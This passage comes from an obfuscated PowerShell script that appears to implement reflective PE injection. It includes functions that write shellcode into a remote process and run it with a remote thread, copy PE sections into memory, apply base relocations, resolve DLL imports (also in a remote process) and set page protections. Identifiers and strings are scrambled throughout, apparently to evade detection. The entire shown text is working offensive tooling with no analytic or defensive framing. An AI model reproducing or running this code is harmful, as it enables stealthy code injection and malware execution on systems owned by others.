		${scp`S`MEM} = &("{0}{3}{2}{1}"-f'Ad','igned','-SignedIntAsUns','d') ${ScPs`m`EM} (${PT`R`sIZe})
		&("{3}{2}{5}{0}{4}{1}" -f 'oM','y','te','Write-By','emor','sT') -Bytes ${GetP`Ro`C`ADdRESSsc4} -MemoryAddress ${s`cpS`mEM}
		${Sc`p`smEM} = &("{2}{0}{5}{1}{3}{4}" -f '-Si','Unsig','Add','ne','d','gnedIntAs') ${S`Cps`MeM} (${Ge`TPrOCAddr`eSSS`c4}."l`e`NGth")
		  (  &("{2}{1}{0}" -f 'e','Et-VARiABL','g') 15Y4hS  )."va`lue"::("{0}{2}{1}"-f 'Structu','tr','reToP').Invoke(${G`ETp`RoCaddrEssre`TMEm}, ${ScP`s`MEm}, ${FaL`se})
		${scpS`M`Em} = &("{6}{3}{4}{5}{1}{2}{0}"-f 'signed','A','sUn','Si','g','nedInt','Add-') ${s`CPSM`eM} (${PT`RSIZE})
		&("{0}{3}{2}{1}" -f'Write-','mory','sToMe','Byte') -Bytes ${Getp`RoCaD`DRESS`SC5} -MemoryAddress ${S`cP`sMEm}
		${Sc`ps`mEm} = &("{0}{5}{3}{2}{1}{4}"-f 'Ad','sUnsigne','dIntA','-Signe','d','d') ${SC`pSMeM} (${getprOC`A`ddres`s`S`c5}."l`EN`GTH")
		
		${RSC`ADDR} = ${WIn3`2fU`NCTiO`NS}."v`iRtua`l`AL`LoceX"."iN`Vo`KE"(${REmOTE`pROC`HAnd`Le},  $1I2l::"Z`eRo", [UIntPtr][UInt64]${s`cLENg`TH}, ${Wi`N32`CONst`A`Nts}."mE`M`_commIT" -bor ${Wi`N32c`onStAN`Ts}."mE`M_`RESe`RVE", ${Wi`N32`C`o`NSTAnTS}."PAGe_EX`EcuTE`_rE`AD`w`RI`TE")
		if (${rsc`A`DDr} -eq  (&('gI') vaRIablE:1I2l  )."vA`lUE"::"Z`ero")
		{
			Throw ("{2}{3}{9}{11}{4}{6}{10}{5}{1}{0}{7}{8}{12}"-f'he re','emory in t','U','nab','o ',' m','a','mote pr','ocess for s','le','llocate',' t','hellcode')
		}
		
		${su`CcE`ss} = ${wi`N3`2F`UncTIoNS}."W`RiTE`pR`Oc`ESSm`EMoRY"."In`Voke"(${Re`mOTEP`ROcH`ANDLE}, ${r`S`CADDR}, ${SCPsM`EmoRigi`N`Al}, [UIntPtr][UInt64]${sCle`NG`Th}, [Ref]${N`UmByTE`SwRIt`T`en})
		if ((${sUc`CE`ss} -eq ${f`Alse}) -or ([UInt64]${NuMbYT`esw`RI`T`T`EN} -ne [UInt64]${S`CLE`NG`Th}))
		{
			Throw ("{3}{4}{8}{6}{1}{10}{0}{2}{9}{7}{5}" -f' p','hell','rocess me','Unabl','e t','y.','write s','or','o ','m','code to remote')
		}
		
		${R`Th`Re`ADHAndlE} = &("{0}{1}{5}{6}{4}{2}{3}" -f'Invo','k','hr','ead','emoteT','e-Creat','eR') -ProcessHandle ${ReMo`TeProChA`Nd`LE} -StartAddress ${rSC`Ad`dR} -Win32Functions ${w`iN32`FUn`CTIoNS}
		${rES`ULt} = ${Wi`N32F`UNCtI`O`Ns}."W`AI`TfO`RsiNgL`e`obj`EcT"."inv`OkE"(${R`TH`R`EAdhA`NDlE}, 20000)
		if (${RES`U`LT} -ne 0)
		{
			Throw ("{11}{0}{5}{9}{6}{7}{4}{3}{1}{8}{12}{2}{13}{10}" -f'll t','t','Address fa','Ge','call ','o Create','ead',' to ','P','RemoteThr','.','Ca','roc','iled')
		}
		
		
		[IntPtr]${rE`TU`RnvALmEM} =   ( &("{2}{0}{1}{3}"-f'T-vARi','a','ge','BLe') 15Y4hs )."v`Alue"::("{2}{3}{0}{1}" -f 'cHGlob','al','Al','lo').Invoke(${Pt`Rs`Ize})
		${RES`U`Lt} = ${wIN32fuN`cT`iO`NS}."READ`pRoCE`Ssm`E`mOry"."invo`Ke"(${R`EmoTePRo`ch`AndLe}, ${gEt`pr`OCADdrESs`R`EtmEM}, ${ReT`U`RNValMeM}, [UIntPtr][UInt64]${p`TrSIZe}, [Ref]${N`Um`BytES`w`RitteN})
		if ((${r`esulT} -eq ${Fal`Se}) -or (${NumbyteSWRI`TT`En} -eq 0))
		{
			Throw ("{4}{6}{3}{0}{5}{2}{8}{1}{7}"-f'to Re','m','Proces',' ','C','ad','all','ory failed','sMe')
		}
		[IntPtr]${proCA`d`DrEss} =  (  &("{0}{3}{1}{2}"-f 'gEt','ArIa','blE','-V')  ('15'+'Y4'+'hs')  -vAlUe)::"pt`RTo`S`TR`UcTurE"(${REtURN`V`ALmEm}, [Type][IntPtr])

		${wiN3`2fUN`cT`IONS}."vIRTuaL`F`REeEX"."i`NvO`Ke"(${R`EmotePRo`c`hA`NDLe}, ${R`sc`AdDr}, [UIntPtr][UInt64]0, ${wi`N`32c`oNstantS}."ME`M_r`e`leASE") | &("{1}{2}{0}"-f't-Null','O','u')
		${w`I`N`32FUnc`TiONS}."V`iRTualFR`Eeex"."INVO`kE"(${rEMoTeP`Ro`C`haNDLE}, ${rf`U`Nc`NaMEPtR}, [UIntPtr][UInt64]0, ${W`IN32cON`ST`Ants}."Mem_`Relea`sE") | &("{1}{0}{2}"-f't-','Ou','Null')
		${W`iN32FUNct`i`oNS}."Vi`RtuAl`FreeEX"."InvO`KE"(${R`emotEpRocHAN`d`le}, ${GetPRo`Cad`D`ReS`SRe`Tm`em}, [UIntPtr][UInt64]0, ${w`I`N3`2`cONSTaNTS}."M`EM_R`EleAse") | &("{0}{2}{1}"-f 'O','t-Null','u')
		
		return ${pRoCA`dD`RE`SS}
	}


	Function CO`pY-`SeCt`Io`NS
	{
		Param(
		[Parameter(POSITION = 0, maNDATorY = ${t`Rue})]
		[Byte[]]
		${P`ebyT`ES},
		
		[Parameter(pOsiTioN = 1, maNdaTOrY = ${TR`UE})]
		[System.Object]
		${Pe`I`NFO},
		
		[Parameter(POSiTIon = 2, mAndAtoRY = ${t`RUE})]
		[System.Object]
		${WiN32f`UnCti`O`Ns},
		
		[Parameter(PoSITIOn = 3, mAnDatoRY = ${T`Rue})]
		[System.Object]
		${WIN32`TY`peS}
		)
		
		for( ${i} = 0; ${I} -lt ${PEiN`Fo}."ImAgE`_N`T_H`ea`ders"."fILeHe`A`DeR"."NUmb`erOFs`eCT`I`oNs"; ${I}++)
		{
			[IntPtr]${sECT`IONhEad`ER`p`Tr} = [IntPtr](&("{2}{3}{1}{0}{4}"-f 'dIntAsUns','igne','Ad','d-S','igned') ([Int64]${p`eInFO}."SEC`TiO`NhEa`der`pTr") (${I} *  (&("{0}{2}{1}" -f'vAri','E','aBL') 15Y4Hs -valUeonly  )::"S`I`ZeOf"([Type]${Wi`N`32ty`pes}."ima`GE_Se`CtIOn_`HEAd`Er")))
			${S`ec`TIo`Nh`EadeR} =   $15y4Hs::"pT`RT`OstR`U`CtUrE"(${s`e`cTiONHeAd`er`ptr}, [Type]${Wi`N`32t`YPes}."ImAG`e_sect`ION`_H`EA`d`eR")
		
			
			[IntPtr]${SEctio`NDE`st`Ad`dR} = [IntPtr](&("{0}{1}{2}{3}" -f'Add','-Si','gnedI','ntAsUnsigned') ([Int64]${P`eIn`Fo}."pEh`AND`lE") ([Int64]${sEct`ioNHEAd`ER}."viRt`Ua`lADDress"))
			
			
			
			
			
			${sIZ`E`ofRawdA`TA} = ${sEctio`N`he`AdEr}."sIzeOfr`A`WdaTA"

			if (${sEct`i`onHea`Der}."p`oinTEr`ToRawdA`TA" -eq 0)
			{
				${si`ZEoFrawDa`TA} = 0
			}
			
			if (${s`I`ZEOfrA`WDa`TA} -gt ${sEctI`oNhE`ADEr}."v`I`RTUals`iZe")
			{
				${sIzeOFR`A`WdaTa} = ${Sec`TI`Onh`ea`DEr}."VIrT`U`ALS`IzE"
			}
			
			if (${s`izEOF`R`AwDaTa} -gt 0)
			{
				&("{3}{4}{5}{0}{2}{1}"-f 'r','geValid','yRan','Te','st','-Memo') -DebugString ("{3}{0}{2}{1}{4}" -f'-','ections:','S','Copy',':MarshalCopy') -PEInfo ${p`eI`NFo} -StartAddress ${Sectio`N`dEs`TAddr} -Size ${SIzEOf`RA`WdaTA} | &("{0}{1}" -f 'Out-Nu','ll')
				  ( &("{0}{1}"-f 'I','tEm')  ('v'+'ARi'+'AB'+'Le:15Y'+'4hS') )."vAL`UE"::"c`opY"(${pe`B`YTEs}, [Int32]${S`ECtIoN`HeA`D`Er}."p`oiN`TErToraWdA`TA", ${SECt`Io`N`DESTaD`dr}, ${SI`zeo`FraWdAtA})
			}
		
			
			if (${s`ectiO`N`hEaDEr}."siZe`O`FRaw`daTa" -lt ${Sec`Tio`N`HEaDer}."vIRtU`A`L`SiZe")
			{
				${dIf`Fe`RE`Nce} = ${SEC`T`ION`Hea`DEr}."VIRtu`AlS`izE" - ${SIZE`Ofrawd`A`Ta}
				[IntPtr]${S`TARt`A`DDrESs} = [IntPtr](&("{2}{0}{3}{1}{4}"-f'sU','n','Add-SignedIntA','nsig','ed') ([Int64]${sEC`TionDe`sT`ADDR}) ([Int64]${SiZEOfr`A`wD`Ata}))
				&("{2}{4}{1}{0}{3}"-f'geV','oryRan','Test-M','alid','em') -DebugString ("{4}{1}{0}{3}{2}"-f'Sections:','py-','Memset',':','Co') -PEInfo ${pe`in`Fo} -StartAddress ${S`TArTA`dDRe`ss} -Size ${DI`FFEREN`cE} | &("{0}{1}{2}" -f 'Ou','t-Nul','l')
				${w`In32F`UN`C`TiONS}."MEM`SEt"."i`Nv`oke"(${st`ARta`d`dreSs}, 0, [IntPtr]${Dif`F`ErEncE}) | &("{2}{0}{1}" -f 'ut-N','ull','O')
			}
		}
	}


	Function UPDAtE`-m`eM`oRy`AddReSseS
	{
		Param(
		[Parameter(poSiTIon = 0, mAndATOrY = ${tr`Ue})]
		[System.Object]
		${p`eI`Nfo},
		
		[Parameter(POsITIon = 1, manDaTOrY = ${tr`Ue})]
		[Int64]
		${OrIGiNAL`Im`AGeBa`SE},
		
		[Parameter(posiTION = 2, mAndATorY = ${t`RuE})]
		[System.Object]
		${WIn3`2`CONStAnTS},
		
		[Parameter(pOsItioN = 3, manDATORY = ${Tr`UE})]
		[System.Object]
		${WIn32tY`p`eS}
		)
		
		[Int64]${bAseDif`F`E`R`EncE} = 0
		${ADD`dIf`F`EReNcE} = ${t`Rue} 
		[UInt32]${iM`Age`Ba`sEreLO`CSiZe} =   ( &('GI')  variABlE:15Y4Hs  )."val`UE"::"s`iZeoF"([Type]${w`IN32`TYP`es}."IM`Age`_B`Ase_reL`oCATI`on")
		
		
		if ((${ori`GI`Na`LI`maG`EbaSE} -eq [Int64]${PEIN`FO}."efFec`TiVe`PeHaNd`lE") `
				-or (${p`E`iNfO}."Im`AG`e_Nt_HE`Ad`eRs"."optiO`NaL`H`EA`DeR"."b`AserE`l`oCAtionTab`LE"."sI`Ze" -eq 0))
		{
			return
		}


		elseif ((&("{0}{3}{5}{1}{4}{2}"-f 'Co','1GreaterThanVal','AsUInt','mpa','2','re-Val') (${or`iginalIM`AgeB`A`sE}) (${peiN`FO}."effeCtI`VEp`E`hA`NDLE")) -eq ${t`RuE})
		{
			${bAS`ED`IF`FERENCE} = &("{2}{1}{5}{3}{4}{0}" -f 'd','-Sign','Sub','dIntAsUnsig','ne','e') (${OriGi`NAlim`AG`eBASe}) (${p`eiN`Fo}."eF`FEC`Tiv`ePEhANdLe")
			${ad`DDIF`FereNCE} = ${FAl`se}
		}
		elseif ((&("{2}{6}{0}{4}{5}{7}{1}{3}" -f 'l','sUI','Compare-','nt','1GreaterThanV','al2','Va','A') (${pE`InFO}."EF`Fect`i`VEPE`haND`le") (${OrigiNalIM`Age`B`A`sE})) -eq ${T`Rue})
		{
			${b`As`E`DIfferE`NCE} = &("{0}{4}{1}{3}{2}" -f'Sub-Si','IntA','d','sUnsigne','gned') (${p`e`iNfo}."E`F`FEcti`Vep`EhAnDLe") (${OrIG`InAlima`g`ebAsE})
		}
		
		
		[IntPtr]${BA`SE`REL`OcptR} = [IntPtr](&("{2}{4}{5}{3}{0}{1}{6}"-f 'nedIntAsUn','s','A','g','dd-','Si','igned') ([Int64]${p`EIn`Fo}."Peh`AndLe") ([Int64]${PeI`NFo}."iMagE_`N`T`_HEade`Rs"."oPT`Io`NAlhe`AdER"."BASeRe`l`o`CATiO`NTAbLE"."VirTUa`Lad`DrE`SS"))
		while(${t`RUE})
		{
			
			${bA`S`erELOcAtI`On`Ta`B`Le} =  ( &("{0}{1}" -f 'VA','RiaBlE') 15Y4Hs  -vaLueoNl )::"pT`R`T`oS`TrUCTUre"(${BaSe`R`E`L`OcPtR}, [Type]${wI`N3`2t`ypES}."imAge`_b`A`sE`_RE`LoCaTI`on")

			if (${BA`SeRE`lo`cATiOn`TA`BlE}."SizeO`FBl`O`ck" -eq 0)
			{
				break
			}

			[IntPtr]${m`eMAddR`B`Ase} = [IntPtr](&("{1}{2}{4}{0}{5}{6}{3}"-f 'edIntAsU','A','d','ned','d-Sign','n','sig') ([Int64]${peI`N`FO}."pEha`N`DlE") ([Int64]${BaSEr`el`o`ca`TiOnt`ABle}."ViR`T`UAL`AdDReSS"))
			${nUmRel`O`Cat`iOns} = (${Bas`erEL`oCa`TiONtAbLe}."Siz`eO`FB`Lock" - ${iM`AG`ebasEREl`OCSizE}) / 2

			
			for(${I} = 0; ${i} -lt ${NUmr`E`Lo`CaTiOns}; ${I}++)
			{
				
				${REl`ocAt`I`onINfoptR} = [IntPtr](&("{2}{1}{3}{0}"-f 'sUnsigned','n','Add-SignedI','tA') ([IntPtr]${b`AsereL`o`c`PTR}) ([Int64]${imA`g`ebAsE`RE`LOC`Size} + (2 * ${I})))
				[UInt16]${rElO`catio`Ni`NfO} =   (&("{2}{1}{0}"-f'E','aBl','VARI') 15y4hs -VAlUeOnLY )::"PtRToS`TrU`CTUrE"(${r`e`LOcaTIONinF`op`TR}, [Type][UInt16])

				
				[UInt16]${ReLOC`ofF`sET} = ${REl`ocat`Io`NinFO} -band 0x0FFF
				[UInt16]${RElOc`T`YPE} = ${Rel`OCAtIOn`iNFO} -band 0xF000
				for (${j} = 0; ${j} -lt 12; ${J}++)
				{
					${r`eLO`CTYPe} =  (&("{0}{2}{3}{1}"-f'GEt-','M','chIlDi','tE')  ('VARIAB'+'le'+':E1'+'iz')  )."v`ALUe"::("{1}{0}" -f 'loor','F').Invoke(${rELo`C`TYPE} / 2)
				}

				
				
				
				if ((${re`L`octYpE} -eq ${W`in3`2cO`Ns`TAnts}."ImaG`E_`Rel`_b`A`SEd_H`IGhloW") `
						-or (${RE`loCt`yPe} -eq ${WIn`32`coNST`ANts}."i`MAg`e_`R`e`L_B`ASED_dIR64"))
				{			
					
					[IntPtr]${F`iNA`La`DDr} = [IntPtr](&("{5}{0}{2}{1}{3}{4}{6}" -f 'dd','gn','-Si','edIntA','sUnsign','A','ed') ([Int64]${ME`maddr`BAsE}) ([Int64]${re`l`O`COFfSET}))
					[IntPtr]${CUR`RaDdR} =  ( &("{3}{1}{0}{2}"-f 'B','et-VArIA','le','g')  ("15"+"y"+"4HS") -VAlUEonly )::"PT`Rtost`RUC`TU`RE"(${Fi`NaLa`DDr}, [Type][IntPtr])
		
					if (${A`d`DDI`FFEreNce} -eq ${Tr`UE})
					{
						[IntPtr]${CU`Rrad`dR} = [IntPtr](&("{5}{2}{3}{1}{0}{4}" -f 'ntA','SignedI','d','d-','sUnsigned','A') ([Int64]${cu`RRA`dDr}) (${b`A`s`EDIffErEn`ce}))
					}
					else
					{
						[IntPtr]${CuRrAd`dR} = [IntPtr](&("{0}{1}{2}{3}{4}"-f'Sub','-SignedInt','As','Unsig','ned') ([Int64]${cU`Rr`ADDr}) (${bA`s`E`DI`FfERENCe}))
					}				

					 $15Y4Hs::("{1}{2}{0}{3}" -f 'eT','St','ructur','oPtr').Invoke(${Curra`D`dR}, ${FiN`Ala`dDR}, ${f`AlSe}) | &("{2}{0}{1}"-f't-','Null','Ou')
				}
				elseif (${rEL`O`C`TYpe} -ne ${Wi`N`32co`NSTaNts}."iMA`Ge_REL_`BA`se`d_AbsoLuTe")
				{
					
					Throw ('Unkn'+'own '+'r'+'elocation'+' '+'found,'+' '+'r'+'e'+'location'+' '+'valu'+'e: '+"$RelocType, "+'r'+'elocat'+'io'+'ninf'+'o: '+"$RelocationInfo")
				}
			}
			
			${bA`Se`Rel`ocptR} = [IntPtr](&("{2}{5}{0}{4}{3}{1}{6}"-f'igne','As','A','Int','d','dd-S','Unsigned') ([Int64]${BasErE`lOC`Ptr}) ([Int64]${BAsEReloc`A`Tio`NT`AB`le}."siZE`O`FB`loCk"))
		}
	}


	Function IMp`OR`T-DlLimPo`RtS
	{
		Param(
		[Parameter(posITiOn = 0, mAnDAtOry = ${T`RUe})]
		[System.Object]
		${P`ei`Nfo},
		
		[Parameter(PositiOn = 1, maNDatORY = ${tr`UE})]
		[System.Object]
		${W`iN32fUNcTi`oNs},
		
		[Parameter(poSITIOn = 2, ManDatory = ${t`RuE})]
		[System.Object]
		${win32`TYP`ES},
		
		[Parameter(PoSiTiOn = 3, mANDAtoRY = ${TR`Ue})]
		[System.Object]
		${Wi`N3`2C`ONstA`Nts},
		
		[Parameter(positiON = 4, manDATORy = ${Fa`lse})]
		[IntPtr]
		${r`eMOt`ep`ROChA`NDle}
		)
		
		${REM`oTeloa`D`I`Ng} = ${F`Alse}
		if (${pE`i`NFO}."pEH`ANDle" -ne ${Pe`IN`FO}."Ef`F`ecTiV`ePEha`Ndle")
		{
			${rEMOT`El`OaD`inG} = ${Tr`UE}
		}
		
		if (${P`eiNFO}."iMag`E_`NT_HEaD`ERS"."oP`T`i`onAl`heaDEr"."im`POrT`T`AbLe"."S`iZe" -gt 0)
		{
			[IntPtr]${I`Mpo`R`TDESCr`iP`TOrptR} = &("{5}{1}{0}{3}{4}{2}" -f'gned','-Si','ed','IntAsU','nsign','Add') ([Int64]${P`e`inFo}."Pe`HAN`DlE") ([Int64]${Pe`iN`Fo}."iM`AgE_NT_HE`A`DErS"."OpTION`AL`H`EADeR"."ImPoRt`TAb`le"."ViR`TuAlAd`dress")
			
			while (${t`RUE})
			{
				${im`PO`RtDescrIp`TOR} =   $15Y4hS::"p`TrTOstRU`CturE"(${IM`Po`RTDe`s`cR`IptORp`Tr}, [Type]${WI`N`3`2typES}."IM`Age`_`imPORT`_descri`p`TOR")
				
				
				if (${Im`POrTde`sCRip`T`oR}."cHAracte`RiSTI`CS" -eq 0 `
						-and ${i`MpOR`Td`ES`CrIptOR}."fI`R`sTThuNk" -eq 0 `
						-and ${i`mPORTdeS`C`RIpTOr}."fO`RWardE`RChaiN" -eq 0 `
						-and ${i`MpoRTDESCr`i`PToR}."nA`me" -eq 0 `
						-and ${impoRt`dE`SC`RipT`oR}."t`Imed`A`TEsT`AmP" -eq 0)
				{
					&("{0}{2}{3}{1}" -f'W','se','r','ite-Verbo') ("{3}{1}{4}{0}{2}" -f'ting D','one','LL imports','D',' impor')
					break
				}

				${im`p`Or`TdlLh`ANdLE} =  (&("{1}{2}{0}" -f 'aBlE','Va','Ri') 1I2L  )."v`ALue"::"Z`Ero"
				${Im`porTD`LLP`A`T`HpTR} = (&("{3}{1}{2}{0}{4}"-f 'ntA','d-Si','gnedI','Ad','sUnsigned') ([Int64]${p`EI`NFo}."p`EhAND`Le") ([Int64]${IM`pO`RT`dEs`criptor}."N`AmE"))
				${iM`por`Tdl`L`PATH} =   ( &("{0}{2}{1}{3}" -f 'Get-c','l','hI','DiTEm')  variabLE:15Y4Hs )."v`AlUe"::("{0}{1}{3}{2}" -f 'PtrToS','tr','si','ingAn').Invoke(${ImpOrTD`L`LpaT`hptR})
				
				if (${remo`TeLOAD`i`Ng} -eq ${T`RuE})
				{
					${I`M`PO`RtDl`LHAndLe} = &("{3}{6}{0}{5}{2}{4}{1}" -f'ort','rocess','e','Im','moteP','-DllInR','p') -RemoteProcHandle ${RE`MoTE`P`RO`CHa`NdlE} -ImportDllPathPtr ${Impor`TDLlp`A`THptR}
				}
				else
				{
					${I`mpORTDL`LhandlE} = ${WiN32F`U`Nc`TIoNS}."LO`Adli`BRarY"."in`VOKe"(${i`mpo`Rtdl`lPAtH})
				}

				if ((${ImPoRtDL`l`HaND`le} -eq ${nu`lL}) -or (${iMP`OrtDl`LHAn`D`le} -eq  (  &("{0}{1}{2}" -f 'Ge','T-','ItEm')  ("VAriAB"+"LE"+":1i2"+"l"))."Va`lUE"::"Ze`RO"))
				{
					throw ('E'+'rror '+'im'+'p'+'orti'+'ng '+'DL'+'L, '+'DL'+'LNam'+'e: '+"$ImportDllPath")
				}
				
				
				[IntPtr]${Th`UNK`ReF} = &("{2}{3}{4}{0}{5}{6}{1}"-f's','d','Add-','SignedIn','tAsUn','ig','ne') (${P`EIn`Fo}."p`EHAnD`LE") (${i`mpOrTD`EsC`R`IPt`Or}."FI`RsTt`hUNK")
				[IntPtr]${OriGI`Nal`Th`UnkRef} = &("{3}{1}{2}{0}" -f 'ed','gnedIntAsUnsig','n','Add-Si') (${pe`InfO}."PeHA`N`dLE") (${ImpoR`Td`ES`C`Ript`oR}."C`hA`RA`CTE`RistiCs") 
				[IntPtr]${OrIgInALthu`Nk`R`e`Fv`AL} =   (&("{0}{2}{1}" -f'VArIA','E','bL') 15Y4hS)."Va`lUe"::"PTR`Tos`Tr`U`CTuRE"(${Or`IGiNA`LthUnKR`eF}, [Type][IntPtr])
				
				while (${ORigiN`AlTHU`NKr`eFVAl} -ne  (  &("{1}{0}{2}"-f'-i','GeT','tEM')  varIaBlE:1i2L )."V`AluE"::"z`ERO")
				{
					${pr`oCEdUreN`A`Me} = ''
					
					
					
					[IntPtr]${n`EwtHU`Nkr`eF} =   (&("{0}{1}"-f 'VaRiAbl','E') ('1'+'I2l')  -vaLU  )::"Z`eRo"
					if([Int64]${oRigI`N`A`LT`HU`NKrEFvaL} -lt 0)
					{
						${prOCed`U`R`enaMe} = [Int64]${oRIgINA`LtHu`NKR`EfVAl} -band 0xffff 
					}
					else
					{
						[IntPtr]${sTRI`N`gADDr} = &("{5}{2}{6}{0}{4}{3}{1}"-f'edIn','sUnsigned','-Sig','A','t','Add','n') (${pE`i`NfO}."P`EhanD`LE") (${oR`IGi`NAL`ThUnkr`EFv`Al})
						${STring`Ad`Dr} = &("{6}{3}{0}{2}{5}{4}{1}" -f'Sign','signed','edInt','-','n','AsU','Add') ${Stri`Ng`A`DdR} (  (  &("{2}{1}{0}" -f 'IabLe','T-vaR','Ge')  15y4hS -vAluEONl)::"S`Iz`EOf"([Type][UInt16]))
						${Pr`o`CEDURE`NAMe} =   $15y4Hs::("{0}{1}{3}{2}"-f'PtrToS','tr','ngAnsi','i').Invoke(${sTR`iNGa`DdR})
					}
					
					if (${REM`Ot`Eloadi`Ng} -eq ${t`RUE})
					{
						[IntPtr]${neW`Thu`NkR`eF} = &("{4}{2}{3}{1}{0}" -f'ress','cAdd','eP','ro','Get-Remot') -RemoteProcHandle ${rE`M`oTepRO`c`HA`NdLe} -RemoteDllHandle ${iMp`oRtDL`lH`A`NdlE} -FunctionName ${PROcE`d`Ur`E`NaME}
					}
					else
					{
						[IntPtr]${New`T`hUnkR`Ef} = ${w`in32FUNctI`OnS}."g`ETPro`CA`DD`ReSs"."iNvo`kE"(${I`M`PoRTdL`lhaN`dlE}, ${PR`ocE`DUre`NaMe})
					}
					
					if (${NEW`THu`NKREf} -eq ${nU`LL} -or ${N`EW`ThUNKr`eF} -eq  $1I2L::"Z`eRo")
					{
						Throw ('New'+' '+'fun'+'cti'+'on '+'ref'+'er'+'e'+'nce '+'i'+'s '+'null'+', '+'th'+'is '+'is'+' '+'almo'+'st'+' '+'cert'+'ain'+'ly '+'a '+'bug'+' '+'in'+' '+'t'+'his '+'scr'+'ipt.'+' '+'Fun'+'ct'+'ion: '+"$ProcedureName. "+'Dl'+'l: '+"$ImportDllPath")
					}

					  (&("{0}{1}" -f'dI','r') ("VArIAB"+"Le:1"+"5y4h"+"S")  )."vA`lUE"::("{3}{2}{0}{1}"-f't','r','tructureToP','S').Invoke(${nEW`T`HUNKRef}, ${TH`UnKr`eF}, ${fA`lSE})
					
					${tHU`Nkr`ef} = &("{3}{2}{0}{1}{4}"-f'edIntAsUn','s','dd-Sign','A','igned') ([Int64]${t`h`Un`KREf}) ( $15Y4HS::"SizE`Of"([Type][IntPtr]))
					[IntPtr]${ori`gi`NA`lTHun`kR`eF} = &("{2}{5}{4}{0}{6}{1}{3}"-f'tA','signe','A','d','nedIn','dd-Sig','sUn') ([Int64]${OrI`G`inaL`THU`NK`ReF}) ( (  &('Ls') ('vaRi'+'AbLE:'+'1'+'5'+'Y4hs'))."V`AlUe"::"si`z`EoF"([Type][IntPtr]))
					[IntPtr]${OrIGI`Na`lT`HUnK`R`efvAl} =   ( &('GI')  VariAbLE:15y4HS )."VAl`Ue"::"pTrToS`T`Ruc`TURE"(${Origi`NALTH`U`NK`R`Ef}, [Type][IntPtr])
				}
				
				${I`mPOrtD`E`ScRI`p`Torptr} = &("{2}{0}{3}{5}{4}{1}" -f 'gne','gned','Add-Si','dIntAsUn','i','s') (${Im`p`orTd`EscRI`ptOrp`Tr}) ( ( &('ls')  ("vAriAbLe:1"+"5y4H"+"s"))."vaL`Ue"::"si`zEOF"([Type]${WI`N`3`2Types}."iMA`gE_i`MpoRT_DeS`CrIP`ToR"))
			}
		}
	}

	Function GeT-ViRtU`ALP`RoTECT`Val`UE
	{
		Param(
		[Parameter(PosITiOn = 0, MAnDaTOry = ${T`RUe})]
		[UInt32]
		${S`EcT`i`ONchAracte`RISt`I`CS}
		)
		
		${pROtE`CTio`NFlaG} = 0x0
		if ((${S`eC`TIO`NChAr`ActeRi`STICS} -band ${WI`N32cO`NS`TANtS}."Im`AGE`_s`cN_me`M`_ExE`cUTe") -gt 0)
		{
			if ((${SEcTIoNchaRac`T`E`RIs`T`i`Cs} -band ${wIN32`Co`N`staNTS}."IMagE`_S`CN_`mem_reAd") -gt 0)
			{
				if ((${Se`Cti`ONchAr`A`ctErIStIcs} -band ${Wi`N3`2`CO`NStANtS}."Im`A`ge_`ScN_`m`em`_wRIte") -gt 0)
				{
					${proTECtIo`NFl`Ag} = ${WiN32`CoN`S`Tants}."pAGE_exE`c`UTE`_r`E`AdWRiTe"
				}
				else
				{
					${pRoT`eCt`I`ONfLAG} = ${wiN3`2co`NSta`Nts}."p`A`ge_EXecutE_rE`Ad"
				}
			}
			else
			{
				if ((${secTIO`NchaRACtERI`st`ics} -band ${W`In32C`onS`T`AnTs}."iM`AGe`_sCN_mE`m`_WR`ItE") -gt 0)
				{
					${pR`ot`E`CtIon`FLAg} = ${Win32C`O`N`StA`Nts}."pAGe`_e`xecUtE_`w`Rite`copY"
				}
				else
				{
					${p`RoTE`ctiONfL`Ag} = ${wIn`32cO`NstA`NtS}."pa`gE_eXE`c`UTE"
				}
			}
		}
		else
		{
			if ((${sEc`TI`oNChA`RACte`Rist`I`cs} -band ${wiN`32C`onsT`Ants}."IMAge_S`Cn_me`M_`RE`AD") -gt 0)
			{
				if ((${sECTIOn`CHara`ctE`R`istiCs} -band ${wIn32COn`St`AN`TS}."i`mAGe_SCN`_`MEm_wRite") -gt 0)
				{
					${prO`TEctI`O`NFlAG} = ${Win32ConSt`A`N`TS}."PAG`e_re`ADwR`ITe"
				}
				else
				{
					${PR`OtEctiO`N`FLAG} = ${wIn32COnS`Tan`TS}."pagE_Rea`don`lY"
				}
			}
			else
			{
				if ((${S`eC`T`IONChaR`ActeRis`TI`Cs} -band ${Win3`2`ConsT`AN`Ts}."i`MAGE`_`sCn_Mem_Wr`I`Te") -gt 0)
				{
					${PRo`T`e`ctI`ONFlAG} = ${wIN`32`C`o`NsTAnTs}."paGE_WRI`TEC`OPy"
				}
				else
				{
					${PrOtEct`IoN`FLaG} = ${wi`N3`2cONSTa`N`TS}."PaG`E_`NO`ACCEss"
				}
			}
		}
		
		if ((${SECt`IoNcHar`A`c`T`eRisT`ics} -band ${w`iN32cO`NsTaNTs}."iMagE_`s`C`N_Mem_nO`T_C`A`cHeD") -gt 0)
		{
			${prOtEC`TI`OnF`l`Ag} = ${p`RO`TeCTi`ON`FlAg} -bor ${Win3`2C`on`stAnts}."paGE`_No`ca`chE"
		}
		
		return ${P`RoTeCtiO`NfLAg}
	}

	Function UpDaTE`-meMorYp`RoTEcTio`N`FlA`gS
	{
		Param(
		[Parameter(POsITIoN = 0, MAndATOry = ${t`RuE})]
		[System.Object]
		${p`Ei`NFO},
		
		[Parameter(POsItIOn = 1, mandATory = ${T`Rue})]
		[System.Object]
		${W`In`3`2`FUnCTioNS},
		
		[Parameter(PoSItIoN = 2, mANdatORY = ${TR`UE})]
		[System.Object]
		${wIn3`2`cOn`STaN`Ts},
		
		[Parameter(poSiTioN = 3, MANdaTOrY = ${t`RuE})]
		[System.Object]
		${WiN3`2TYP`eS}
		)
		
		for( ${i} = 0; ${I} -lt ${Pe`iN`Fo}."iMA`g`e_N`T_He`ADErs"."FiLe`hEA`DER"."NU`MbErOfSectIo`NS"; ${i}++)
		{
			[IntPtr]${SEc`TI`ONHe`Ad`erP`TR} = [IntPtr](&("{4}{2}{0}{1}{3}" -f'ignedIntAsUns','i','dd-S','gned','A') ([Int64]${PE`i`NFO}."Sec`T`I`OnHea`DeRPtr") (${i} *   (&("{0}{1}{2}"-f'gET-I','t','Em') VariAbLE:15Y4HS  )."val`UE"::"SizE`Of"([Type]${wiN`32TYp`es}."ima`g`e_sec`TiOn_HEaDeR")))
